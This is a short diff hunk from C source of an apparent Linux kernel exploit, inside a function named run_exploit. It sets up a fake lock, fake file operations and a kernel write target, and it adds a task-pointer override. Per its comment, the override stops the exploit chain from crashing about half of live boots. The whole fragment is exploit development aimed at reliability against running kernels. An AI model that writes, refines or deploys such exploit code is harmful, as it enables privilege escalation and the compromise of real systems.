@@ -818,6 +818,13 @@ int run_exploit(int argc, char **argv) {
       fake_lock = tail + 0x400;
       fake_fops = tail;
       binwrite_target = tail + 0x200;
+      /* word8 task = zeroed tail slot: ttwu() sees state=0 and returns
+       * before enqueue — replaces wake_up_process(init_task), which
+       * wakes the idle task and crashes ~50% of live boots. */
+      {
+        extern uintptr_t sc_task_override;
+        sc_task_override = tail + 0x800;
+      }
       pr_info("STATIC_CHAIN: spray skipped, tail=%016zx\n", tail);
     } else {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
